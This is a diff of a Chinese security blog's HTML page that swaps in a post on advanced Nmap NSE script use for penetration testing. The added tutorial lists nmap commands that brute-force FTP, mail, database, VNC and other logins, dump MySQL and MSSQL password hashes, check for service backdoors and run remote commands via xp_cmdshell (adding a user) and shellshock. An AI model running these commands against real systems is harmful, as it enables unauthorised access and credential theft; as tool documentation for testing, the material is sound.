@@ -86,17 +86,17 @@
 
 
 
-<meta name="description" content="彻底理解Windows认证 - 议题解读:原文:彻底理解window认证">
+<meta name="description" content="前言 在这篇文章中，我们将研究最著名的渗透工具之一 Nmap 一款标志性的跨平台扫描器。它的原意为Network Mapper（网络映射器），具有相当强大的扫描功能，几乎适用于任何渗透场景。不少人甚至认为它就是全球最好的扫描软件。除了常规的网络扫描，Nmap还可根据NSE (Nmap scripting Engine)的脚本进行大量渗透工作，这种脚本是基于Lua编程语言，有点像javascript">
 <meta property="og:type" content="article">
-<meta property="og:title" content="彻底理解Windows认证 - 议题解读">
-<meta property="og:url" content="http://MaiKeFee.com/archives/58b20026.html">
+<meta property="og:title" content="Nmap_进阶使用[脚本篇]">
+<meta property="og:url" content="http://MaiKeFee.com/archives/b0bdc71c.html">
 <meta property="og:site_name" content="MaiKeFee|">
-<meta property="og:description" content="彻底理解Windows认证 - 议题解读:原文:彻底理解window认证">
+<meta property="og:description" content="前言 在这篇文章中，我们将研究最著名的渗透工具之一 Nmap 一款标志性的跨平台扫描器。它的原意为Network Mapper（网络映射器），具有相当强大的扫描功能，几乎适用于任何渗透场景。不少人甚至认为它就是全球最好的扫描软件。除了常规的网络扫描，Nmap还可根据NSE (Nmap scripting Engine)的脚本进行大量渗透工作，这种脚本是基于Lua编程语言，有点像javascript">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-09-05T03:47:03.349Z">
+<meta property="og:updated_time" content="2019-09-08T18:06:40.829Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="彻底理解Windows认证 - 议题解读">
-<meta name="twitter:description" content="彻底理解Windows认证 - 议题解读:原文:彻底理解window认证">
+<meta name="twitter:title" content="Nmap_进阶使用[脚本篇]">
+<meta name="twitter:description" content="前言 在这篇文章中，我们将研究最著名的渗透工具之一 Nmap 一款标志性的跨平台扫描器。它的原意为Network Mapper（网络映射器），具有相当强大的扫描功能，几乎适用于任何渗透场景。不少人甚至认为它就是全球最好的扫描软件。除了常规的网络扫描，Nmap还可根据NSE (Nmap scripting Engine)的脚本进行大量渗透工作，这种脚本是基于Lua编程语言，有点像javascript">
 
 
 
@@ -126,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/archives/58b20026.html">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/b0bdc71c.html">
 
 
 
 
 
-  <title>彻底理解Windows认证 - 议题解读 | MaiKeFee|</title>
+  <title>Nmap_进阶使用[脚本篇] | MaiKeFee|</title>
   
 
 
@@ -312,7 +312,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/58b20026.html">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/b0bdc71c.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="MaiKeFee">
@@ -329,7 +329,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">彻底理解Windows认证 - 议题解读</h1>
+          <h1 class="post-title" itemprop="name headline">Nmap_进阶使用[脚本篇]</h1>
         
 
         <div class="post-meta">
@@ -341,8 +341,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-29T10:27:24+08:00">
-                2019-08-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-09-09T01:38:05+08:00">
+                2019-09-09
               </time>
             
 
@@ -357,8 +357,8 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-05T11:47:03+08:00">
-                2019-09-05
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-09T02:06:40+08:00">
+                2019-09-09
               </time>
             
           </span>
@@ -387,8 +387,19 @@
                 
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/知识科普/" itemprop="url" rel="index">
-                    <span itemprop="name">知识科普</span>
+                  <a href="/categories/渗透测试/工具篇/" itemprop="url" rel="index">
+                    <span itemprop="name">工具篇</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/工具篇/nmap/" itemprop="url" rel="index">
+                    <span itemprop="name">nmap</span>
                   </a>
                 </span>
 
@@ -405,8 +416,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/archives/58b20026.html#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/archives/58b20026.html" itemprop="commentCount"></span>
+                <a href="/archives/b0bdc71c.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/archives/b0bdc71c.html" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -414,7 +425,7 @@
 
           
           
-             <span id="/archives/58b20026.html" class="leancloud_visitors" data-flag-title="彻底理解Windows认证 - 议题解读">
+             <span id="/archives/b0bdc71c.html" class="leancloud_visitors" data-flag-title="Nmap_进阶使用[脚本篇]">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -440,7 +451,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  20
+                  3.2k
                 </span>
               
 
@@ -456,7 +467,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1
+                  14
                 </span>
               
             </div>
@@ -477,7 +488,90 @@
       
 
       
-        <h2 id="彻底理解Windows认证-议题解读"><a href="#彻底理解Windows认证-议题解读" class="headerlink" title="彻底理解Windows认证 - 议题解读:"></a>彻底理解Windows认证 - 议题解读:</h2><p>原文:<br><a href="https://payloads.online/archivers/2018-11-30/1" target="_blank" rel="noopener">彻底理解window认证</a></p>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>在这篇文章中，我们将研究最著名的渗透工具之一 Nmap 一款标志性的跨平台扫描器。它的原意为Network Mapper（网络映射器），具有相当强大的扫描功能，几乎适用于任何渗透场景。不少人甚至认为它就是全球最好的扫描软件。除了常规的网络扫描，Nmap还可根据NSE (Nmap scripting Engine)的脚本进行大量渗透工作，这种脚本是基于Lua编程语言，有点像javascript。正是NSE，使得Nmap不再普通。</p>
+</blockquote>
+<pre><code>nmap -sV -sT -Pn --open -v 192.168.3.23</code></pre><p>当然,你也可以用下面的脚本先尝试获取下目标机器更详细的服务banner信息[不过这个并不详细,有时候简单telnet下就直接能看到详细的banner了,用不着nmap],看具体版本的原因是因为有些服务工具漏洞只能利用在特定的版本上,所以,提前知道大概一下还是非常有必要的,废话到此为止,咱们开始真正的内容</p>
+<pre><code>nmap -sT -Pn --open -v banner.nse 192.168.3.23</code></pre><h1 id="和ftp相关的一些漏洞检测脚本"><a href="#和ftp相关的一些漏洞检测脚本" class="headerlink" title="和ftp相关的一些漏洞检测脚本"></a>和ftp相关的一些漏洞检测脚本</h1><h2 id="ftp-anon-nse"><a href="#ftp-anon-nse" class="headerlink" title="ftp-anon.nse"></a>ftp-anon.nse</h2><p>检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,比如你想快速批量抓一些ftp</p>
+<pre><code>nmap -p 21 --script ftp-anon.nse -v 192.168.3.23</code></pre><h2 id="ftp-brute-nse"><a href="#ftp-brute-nse" class="headerlink" title="ftp-brute.nse"></a>ftp-brute.nse</h2><p>ftp爆破脚本[默认只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个速度可能还会更慢),毕竟,是直接在公网爆破]</p>
+<pre><code>nmap -p 21 --script ftp-brute.nse -v 192.168.3.23</code></pre><h2 id="ftp-vuln-cve2010-4221-nse"><a href="#ftp-vuln-cve2010-4221-nse" class="headerlink" title="ftp-vuln-cve2010-4221.nse"></a>ftp-vuln-cve2010-4221.nse</h2><p>ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出</p>
+<pre><code>nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23</code></pre><h2 id="ftp-proftpd-backdoor-nse"><a href="#ftp-proftpd-backdoor-nse" class="headerlink" title="ftp-proftpd-backdoor.nse"></a>ftp-proftpd-backdoor.nse</h2><p>ProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令</p>
+<pre><code>nmap -p 21 --script ftp-vuln-cve2010-4221.nse -v 192.168.3.23</code></pre><h2 id="ftp-vsftpd-backdoor-nse"><a href="#ftp-vsftpd-backdoor-nse" class="headerlink" title="ftp-vsftpd-backdoor.nse"></a>ftp-vsftpd-backdoor.nse</h2><p>VSFTPD v2.3.4 跟Proftp同样的问题,被人捅进去以后在代码里面插了后门</p>
+<pre><code>nmap -p 21 --script ftp-vsftpd-backdoor.nse -v 192.168.3.23</code></pre><h1 id="和ssh-相关的一些扫描脚本"><a href="#和ssh-相关的一些扫描脚本" class="headerlink" title="和ssh 相关的一些扫描脚本"></a>和ssh 相关的一些扫描脚本</h1><h2 id="sshv1-nse"><a href="#sshv1-nse" class="headerlink" title="sshv1.nse"></a>sshv1.nse</h2><p>大家都知道的,sshv1是可以被中间人的</p>
+<pre><code>nmap -p 22 --script sshv1.nse -v 192.168.3.23</code></pre><h1 id="和smtp-pop3-imap相关的一些扫描脚本"><a href="#和smtp-pop3-imap相关的一些扫描脚本" class="headerlink" title="和smtp,pop3,imap相关的一些扫描脚本"></a>和smtp,pop3,imap相关的一些扫描脚本</h1><blockquote>
+<p>smtp-brute.nse  </p>
+</blockquote>
+<h2 id="爆破smtp弱口令"><a href="#爆破smtp弱口令" class="headerlink" title="爆破smtp弱口令"></a>爆破smtp弱口令</h2><p>简单爆破smtp弱口令,拿这个爆进去的邮箱给人发信也许成功率会稍微高一点</p>
+<pre><code>nmap -p 25 --script smtp-brute.nse -v 192.168.3.23</code></pre><blockquote>
+<p>smtp-enum-users.nse  </p>
+</blockquote>
+<h2 id="枚举目标smtp服务器"><a href="#枚举目标smtp服务器" class="headerlink" title="枚举目标smtp服务器"></a>枚举目标smtp服务器</h2><p>枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行,搜集一些必要的信息还是蛮好的</p>
+<pre><code>nmap -p 25 --script smtp-enum-users.nse -v 192.168.3.23</code></pre><blockquote>
+<p>smtp-vuln-cve2010-4344.nse </p>
+</blockquote>
+<h2 id="string-vformat函数中存在堆溢出"><a href="#string-vformat函数中存在堆溢出" class="headerlink" title="string_vformat函数中存在堆溢出"></a>string_vformat函数中存在堆溢出</h2><p>Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出</p>
+<pre><code>nmap -p 25 --script smtp-vuln-cve2010-4344.nse -v 192.168.3.23</code></pre><blockquote>
+<p>smtp-vuln-cve2011-1720.nse </p>
+</blockquote>
+<h2 id="Postfix-溢出"><a href="#Postfix-溢出" class="headerlink" title="Postfix 溢出"></a>Postfix 溢出</h2><blockquote>
+<p>Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出</p>
+</blockquote>
+<pre><code>nmap -p 25 --script smtp-vuln-cve2011-1720.nse -v 192.168.3.23</code></pre><blockquote>
+<p>smtp-vuln-cve2011-1764.nse </p>
+</blockquote>
+<h2 id="Exim字符串漏洞"><a href="#Exim字符串漏洞" class="headerlink" title="Exim字符串漏洞"></a>Exim字符串漏洞</h2><p>Exim dkim_exim_verify_finish() 存在格式字符串漏洞,太老现在基本很难遇到了</p>
+<pre><code>nmap -p 25 --script smtp-vuln-cve2011-1764.nse -v 192.168.3.23</code></pre><blockquote>
+<p>pop3-brute.nse</p>
+</blockquote>
+<h2 id="pop简单弱口令爆破"><a href="#pop简单弱口令爆破" class="headerlink" title="pop简单弱口令爆破"></a>pop简单弱口令爆破</h2><pre><code>nmap -p 110 --script pop3-brute.nse -v 192.168.3.23</code></pre><blockquote>
+<p>imap-brute.nse </p>
+</blockquote>
+<h2 id="imap简单弱口令爆破"><a href="#imap简单弱口令爆破" class="headerlink" title="imap简单弱口令爆破"></a>imap简单弱口令爆破</h2><pre><code>nmap -p 143,993 --script imap-brute.nse -v 192.168.3.23</code></pre><h1 id="和dns-相关的一些漏洞扫描脚本"><a href="#和dns-相关的一些漏洞扫描脚本" class="headerlink" title="和dns 相关的一些漏洞扫描脚本"></a>和dns 相关的一些漏洞扫描脚本</h1><blockquote>
+<p>dns-zone-transfer.nse    </p>
+</blockquote>
+<h2 id="域传送漏洞"><a href="#域传送漏洞" class="headerlink" title="域传送漏洞"></a>域传送漏洞</h2><blockquote>
+<p>检查目标ns服务器是否允许传送,如果能,直接把子域拖出来就好了</p>
+</blockquote>
+<pre><code>nmap -p 53 --script dns-zone-transfer.nse -v 192.168.3.23
+nmap -p 53 --script dns-zone-transfer.nse --script-args dns-zone-transfer.domain=target.org -v 192.168.3.23</code></pre><h2 id="旁站查询"><a href="#旁站查询" class="headerlink" title="旁站查询"></a>旁站查询</h2><blockquote>
+<p>hostmap-ip2hosts.nse   旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉</p>
+</blockquote>
+<pre><code>nmap -p80 --script hostmap-ip2hosts.nse 192.168.3.23</code></pre><h1 id="和各种数据库相关的一些扫描脚本"><a href="#和各种数据库相关的一些扫描脚本" class="headerlink" title="和各种数据库相关的一些扫描脚本"></a>和各种数据库相关的一些扫描脚本</h1><h2 id="informix爆破脚本"><a href="#informix爆破脚本" class="headerlink" title="informix爆破脚本"></a>informix爆破脚本</h2><blockquote>
+<p>informix-brute.nse   informix爆破脚本</p>
+</blockquote>
+<pre><code>nmap -p 9088 --script informix-brute.nse 192.168.3.23</code></pre><h2 id="mysql-扫描root空密码"><a href="#mysql-扫描root空密码" class="headerlink" title="mysql 扫描root空密码"></a>mysql 扫描root空密码</h2><blockquote>
+<p>mysql-empty-password.nse   mysql 扫描root空密码,比如你想批量抓mysql</p>
+</blockquote>
+<pre><code>nmap -p 3306 --script mysql-empty-password.nse -v 192.168.3.23</code></pre><h2 id="mysql-root弱口令简单爆破"><a href="#mysql-root弱口令简单爆破" class="headerlink" title="mysql root弱口令简单爆破"></a>mysql root弱口令简单爆破</h2><blockquote>
+<p>mysql-brute.nse    mysql root弱口令简单爆破</p>
+</blockquote>
+<pre><code>nmap -p 3306 --script mysql-brute.nse -v 192.168.3.23</code></pre><h2 id="导出mysql中所有用户的hash"><a href="#导出mysql中所有用户的hash" class="headerlink" title="导出mysql中所有用户的hash"></a>导出mysql中所有用户的hash</h2><blockquote>
+<p>mysql-dump-hashes.nse    导出mysql中所有用户的hash</p>
+</blockquote>
+<pre><code>nmap -p 3306 --script mysql-dump-hashes --script-args=&apos;username=root,password=root&apos; 192.168.3.23</code></pre><h2 id="Mysql身份认证漏洞"><a href="#Mysql身份认证漏洞" class="headerlink" title="Mysql身份认证漏洞"></a>Mysql身份认证漏洞</h2><blockquote>
+<p>mysql-vuln-cve2012-2122.nse   Mysql身份认证漏洞[MariaDB and MySQL  5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高]</p>
+</blockquote>
+<pre><code>nmap -p 3306 --script mysql-vuln-cve2012-2122.nse  -v 192.168.3.23</code></pre><h2 id="扫描C段mssql"><a href="#扫描C段mssql" class="headerlink" title="扫描C段mssql"></a>扫描C段mssql</h2><pre><code>nmap -p 445 --script ms-sql-info.nse -v 203.124.11.0/24      ms-sql-info.nse 扫描C段mssql</code></pre><h2 id="扫描mssql-sa空密码"><a href="#扫描mssql-sa空密码" class="headerlink" title="扫描mssql sa空密码"></a>扫描mssql sa空密码</h2><pre><code>nmap -p 1433 --script ms-sql-info.nse --script-args mssql.instance-port=1433 -v 192.168.3.0/24
+
+ms-sql-empty-password.nse 扫描mssql sa空密码,比如你想批量抓mssql
+
+nmap -p 1433 --script ms-sql-empty-password.nse -v 192.168.3.0/24</code></pre><h2 id="sa弱口令爆破"><a href="#sa弱口令爆破" class="headerlink" title="sa弱口令爆破"></a>sa弱口令爆破</h2><pre><code>nmap -p 1433 --script ms-sql-brute.nse -v 192.168.3.0/24</code></pre><h2 id="利用xp-cmdshell-远程执行系统命令"><a href="#利用xp-cmdshell-远程执行系统命令" class="headerlink" title="利用xp_cmdshell,远程执行系统命令"></a>利用xp_cmdshell,远程执行系统命令</h2><pre><code>nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=net user test test add 192.168.3.0/24</code></pre><h2 id="导出mssql中所有的数据库用户及密码hash"><a href="#导出mssql中所有的数据库用户及密码hash" class="headerlink" title="导出mssql中所有的数据库用户及密码hash"></a>导出mssql中所有的数据库用户及密码hash</h2><pre><code>nmap -p 1433 --script ms-sql-dump-hashes -v 192.168.3.0/24</code></pre><h2 id="爆破postgresql"><a href="#爆破postgresql" class="headerlink" title="爆破postgresql"></a>爆破postgresql</h2><pre><code>nmap -p 5432 --script pgsql-brute -v 192.168.3.0/24</code></pre><h2 id="爆破oracle"><a href="#爆破oracle" class="headerlink" title="爆破oracle"></a>爆破oracle</h2><pre><code>nmap --script oracle-brute-stealth -p 1521 --script-args oracle-brute-stealth.sid=ORCL  -v 192.168.3.0/24
+
+
+nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL -v 192.168.3.0/24</code></pre><h2 id="爆破mongdb"><a href="#爆破mongdb" class="headerlink" title="爆破mongdb"></a>爆破mongdb</h2><pre><code>nmap -p 27017  --script mongodb-brute 192.168.3.0/24
+
+nmap -p 6379 --script redis-brute.nse 192.168.3.0/24</code></pre><h1 id="和snmp相关的一些扫描脚本-用来搜集些内网信息还行-运气好也许还能查到账号密码什么的"><a href="#和snmp相关的一些扫描脚本-用来搜集些内网信息还行-运气好也许还能查到账号密码什么的" class="headerlink" title="和snmp相关的一些扫描脚本,用来搜集些内网信息还行,运气好也许还能查到账号密码什么的"></a>和snmp相关的一些扫描脚本,用来搜集些内网信息还行,运气好也许还能查到账号密码什么的</h1><h2 id="爆破C段的snmp"><a href="#爆破C段的snmp" class="headerlink" title="爆破C段的snmp"></a>爆破C段的snmp</h2><pre><code>nmap -sU --script snmp-brute --script-args snmp-brute.communitiesdb=user.txt 192.168.3.0/24</code></pre><h1 id="和telnet相关的一些扫描脚本"><a href="#和telnet相关的一些扫描脚本" class="headerlink" title="和telnet相关的一些扫描脚本"></a>和telnet相关的一些扫描脚本</h1><h1 id="简单爆破telnet"><a href="#简单爆破telnet" class="headerlink" title="简单爆破telnet"></a>简单爆破telnet</h1><pre><code>nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s -v 192.168.3.0/24</code></pre><h1 id="和ldap服务相关的一些利用脚本"><a href="#和ldap服务相关的一些利用脚本" class="headerlink" title="和ldap服务相关的一些利用脚本"></a>和ldap服务相关的一些利用脚本</h1><h2 id="简单爆破ldap"><a href="#简单爆破ldap" class="headerlink" title="简单爆破ldap"></a>简单爆破ldap</h2><pre><code>nmap -p 389 --script ldap-brute --script-args ldap.base=&apos;cn=users,dc=cqure,dc=net&apos; 192.168.3.0/24</code></pre><h1 id="和各类web中间件-web集成环境相关的一些利用脚本"><a href="#和各类web中间件-web集成环境相关的一些利用脚本" class="headerlink" title="和各类web中间件,web集成环境相关的一些利用脚本"></a>和各类web中间件,web集成环境相关的一些利用脚本</h1><h2 id="xmpp爆破"><a href="#xmpp爆破" class="headerlink" title="xmpp爆破"></a>xmpp爆破</h2><pre><code>nmap -p 5222 --script xmpp-brute.nse  192.168.3.0/24</code></pre><h2 id="短文件扫描"><a href="#短文件扫描" class="headerlink" title="短文件扫描"></a>短文件扫描</h2><pre><code>nmap -p80 --script http-iis-short-name-brute.nse 192.168.3.0/24</code></pre><h2 id="iis-5-0-6-0-webadv写"><a href="#iis-5-0-6-0-webadv写" class="headerlink" title="iis 5.0 6.0 webadv写"></a>iis 5.0 6.0 webadv写</h2><pre><code>nmap --script http-iis-webdav-vuln.nse -p80,8080 192.168.3.0/24</code></pre><h2 id="bash远程执行"><a href="#bash远程执行" class="headerlink" title="bash远程执行"></a>bash远程执行</h2><pre><code>nmap -sV -p- --script http-shellshock --script-args uri=cgi-binbin,cmd=ls 192.168.3.0/24</code></pre><h2 id="探测目标svn"><a href="#探测目标svn" class="headerlink" title="探测目标svn"></a>探测目标svn</h2><pre><code>nmap --script http-svn-info 192.168.3.0/24</code></pre><h2 id="其实对于这类的开源程序-我们根本没必要用nmap-因为搞多了-差不多一眼就能看出来"><a href="#其实对于这类的开源程序-我们根本没必要用nmap-因为搞多了-差不多一眼就能看出来" class="headerlink" title="其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来"></a>其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来</h2><pre><code>nmap -p80 -sV --script http-wordpress-brute --script-args &apos;userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true&apos; 192.168.3.0/24</code></pre><h2 id="扫描目标网站备份"><a href="#扫描目标网站备份" class="headerlink" title="扫描目标网站备份"></a>扫描目标网站备份</h2><pre><code>nmap -p80 --script=http-backup-finder 192.168.3.0/24</code></pre><h2 id="iis6-0远程代码执行"><a href="#iis6-0远程代码执行" class="headerlink" title="iis6.0远程代码执行"></a>iis6.0远程代码执行</h2><pre><code>nmap -sV --script http-vuln-cve --script-args uri=&apos;anotheruri&apos;  192.168.3.0/24</code></pre><h1 id="跟vpn相关的一些利用脚本"><a href="#跟vpn相关的一些利用脚本" class="headerlink" title="跟vpn相关的一些利用脚本"></a>跟vpn相关的一些利用脚本</h1><h2 id="识别目标pptp版本"><a href="#识别目标pptp版本" class="headerlink" title="识别目标pptp版本"></a>识别目标pptp版本</h2><p>暂时只看到一个pptp暂时还好使,其实pptp也是可以爆破的,嘿嘿……不过,实际目标中,pptp几乎没有,openvpn偏多,想直接捅目标内网,这无疑是很不错的入口</p>
+<pre><code>nmap -p 1723 --script pptp-version.nse 192.168.3.0/24</code></pre><h1 id="smb漏洞检测脚本集"><a href="#smb漏洞检测脚本集" class="headerlink" title="smb漏洞检测脚本集"></a>smb漏洞检测脚本集</h1><pre><code>smb-vuln-ms08-067.nse
+smb-vuln-ms10-054.nse
+smb-vuln-ms10-061.nse
+smb-vuln-ms17-010.nse  smb远程执行
+nmap -p445 --script smb-vuln-ms17-010.nse 192.168.3.0/24</code></pre><h1 id="检测内网嗅探"><a href="#检测内网嗅探" class="headerlink" title="检测内网嗅探"></a>检测内网嗅探</h1><p>实际测试中,貌似并没什么卵用</p>
+<pre><code>nmap -sn -Pn --script sniffer-detect.nse 192.168.3.0/24</code></pre><h1 id="其它的一些辅助性脚本"><a href="#其它的一些辅助性脚本" class="headerlink" title="其它的一些辅助性脚本"></a>其它的一些辅助性脚本</h1><p>其实有些实际用途可能并不大,大家选择性的用极好了</p>
+<h2 id="爆破目标的rsync"><a href="#爆破目标的rsync" class="headerlink" title="爆破目标的rsync"></a>爆破目标的rsync</h2><pre><code>nmap -p 873 --script rsync-brute --script-args &apos;rsync-brute.module=www&apos; 192.168.3.0/24</code></pre><h2 id="爆破目标的rlogin"><a href="#爆破目标的rlogin" class="headerlink" title="爆破目标的rlogin"></a>爆破目标的rlogin</h2><pre><code>nmap -p 513 --script rlogin-brute 192.168.3.0/24</code></pre><h2 id="爆破目标的vnc"><a href="#爆破目标的vnc" class="headerlink" title="爆破目标的vnc"></a>爆破目标的vnc</h2><pre><code>nmap --script vnc-brute -p 5900 192.168.3.0/24</code></pre><h2 id="爆破pcanywhere"><a href="#爆破pcanywhere" class="headerlink" title="爆破pcanywhere"></a>爆破pcanywhere</h2><pre><code>nmap -p 5631 --script=pcanywhere-brute 192.168.3.0/24</code></pre><h2 id="爆破nessus-貌似现在已经不是1241端口了-实在是太老了-直接忽略吧"><a href="#爆破nessus-貌似现在已经不是1241端口了-实在是太老了-直接忽略吧" class="headerlink" title="爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧"></a>爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧</h2><pre><code>nmap --script nessus-brute -p 1241 192.168.3.0/24</code></pre><h2 id="爆破nexpose"><a href="#爆破nexpose" class="headerlink" title="爆破nexpose"></a>爆破nexpose</h2><pre><code>nmap --script nexpose-brute -p 3780 192.168.3.0/24</code></pre><p>shodan-api.nse  配合shodan接口进行扫描,如果自己手里有0day,配合着一起用,这个威力还是不可小觑的,不过在即实际测的时候貌似还有些问题</p>
+<pre><code>nmap --script shodan-api --script-args &apos;shodan-api.target=192.168.3.0/24,shodan-api.apikey=SHODANAPIKEY&apos;</code></pre><h1 id="尝试利用nmap一句话对目标C段进行常规漏洞扫描"><a href="#尝试利用nmap一句话对目标C段进行常规漏洞扫描" class="headerlink" title="尝试利用nmap一句话对目标C段进行常规漏洞扫描"></a>尝试利用nmap一句话对目标C段进行常规漏洞扫描</h1><p>实际测试中,会非常的慢,可能跑一个脚本验证时间都要很长,尤其在你的vps带宽不是很足,网络又不怎么好的时候,速度就更慢了,所以还是建议先大致扫一眼目标服务,然后再单独针对性的扫,这样实际的成功率可能会高很多,毕竟,不是像masscan或者zamp这种基于无状态的扫描</p>
+<pre><code>nmap -sT -Pn -v --script dns-zone-transfer.nse,ftp-anon.nse,ftp-proftpd-backdoor.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse,http-backup-finder.nse,http-cisco-anyconnect.nse,http-iis-short-name-brute.nse,http-put.nse,http-php-version.nse,http-shellshock.nse,http-robots.txt.nse,http-svn-enum.nse,http-webdav-scan.nse,iis-buffer-overflow.nse,iax2-version.nse,memcached-info.nse,mongodb-info.nse,msrpc-enum.nse,ms-sql-info.nse,mysql-info.nse,nrpe-enum.nse,pptp-version.nse,redis-info.nse,rpcinfo.nse,samba-vuln-cve-2012-1182.nse,smb-vuln-ms08-067.nse,smb-vuln-ms17-010.nse,snmp-info.nse,sshv1.nse,xmpp-info.nse,tftp-enum.nse,teamspeak2-version.nse 192.168.3.0/24</code></pre><p>尝试利用nmap一句话对目标进行C段弱口令爆破,还是上面的问题,验证一个漏洞都要那么久,更不要说跑完一个弱口令字典,nmap默认的弱口令字典大概是5000左右,也就是说一个用户名就要跑大概5000次,估计你vps带宽再小点儿的话,这个就没什么谱了,毕竟我们是在公网,不是在内网,所以,还是建议最好不要同时加载很多个弱口令爆破脚本,如果实在没办法必须爆破,可以多花点儿时间,去搜集目标有价值的用户名,以此尽可能提高自己的命中率</p>
+<pre><code>nmap -sT -v -Pn --script ftp-brute.nse,imap-brute.nse,smtp-brute.nse,pop3-brute.nse,mongodb-brute.nse,redis-brute.nse,ms-sql-brute.nse,rlogin-brute.nse,rsync-brute.nse,mysql-brute.nse,pgsql-brute.nse,oracle-sid-brute.nse,oracle-brute.nse,rtsp-url-brute.nse,snmp-brute.nse,svn-brute.nse,telnet-brute.nse,vnc-brute.nse,xmpp-brute.nse 192.168.3.0/24</code></pre><p>后话:</p>
+<pre><code>由于nmap内置丰富的漏洞扫描脚本,也使得nmap的能力在一定程度得到了极大的扩展,意味者我们完全可以自己按照nmap事先规定好的语法来模仿实现一些简单的定制扫描,这也是让我感觉nmap做的非常好的一点,极大的可扩展性,比如,你自己握有0day的时候,想自动化干点儿什么事儿,嘿嘿……具体就不多说了,相信大家都懂,^_^,没错,masscan,zmap这种基于无状态的扫描确实快的吓人,而且shodan api也是个很不错的选择,但对定制脚本支持始终还是差了点,时间关系只挑了一些可能用到的脚本,今天就简单聊到这儿吧,工具没有没有好坏,虽然实战中不一定都能用上,关键还是大家在实际渗透过程中能灵活变通就好,话说回来,这一切的前提都是建立在别人让你扫的基础之上的,nmap的标志实在是太招摇过市了,nmap所支持的那几种扫描类型,估计早已被各种ids所免疫,说实话,有些目标可能都没什么机会让你扫,关于nmap其它的一些用法,后期遇到相对比较实用的会不定期再更新上来,大家如果有兴趣,也可以直接去参考官方,那里说的还是非常详细的,起码比我这个要详细很多,有任何问题请直接私信我</code></pre><p>参考:<a href="https://www.freebuf.com/column/149716.html" target="_blank" rel="noopener">https://www.freebuf.com/column/149716.html</a></p>
 
       
     </div>
@@ -504,12 +598,12 @@
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
 
-  <p><span>本文标题:</span>彻底理解Windows认证 - 议题解读</p>
+  <p><span>本文标题:</span>Nmap_进阶使用[脚本篇]</p>
   <p><span>文章作者:</span>MaiKeFee</p>
-  <p><span>发布时间:</span>2019年08月29日</p>
-  <p><span>最后更新:</span>2019年09月05日</p>
-  <p><span>原始链接:</span><a href="/archives/58b20026.html" title="彻底理解Windows认证 - 议题解读">http://MaiKeFee.com/archives/58b20026.html</a>
-    <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://MaiKeFee.com/archives/58b20026.html" aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2019年09月09日</p>
+  <p><span>最后更新:</span>2019年09月09日</p>
+  <p><span>原始链接:</span><a href="/archives/b0bdc71c.html" title="Nmap_进阶使用[脚本篇]">http://MaiKeFee.com/archives/b0bdc71c.html</a>
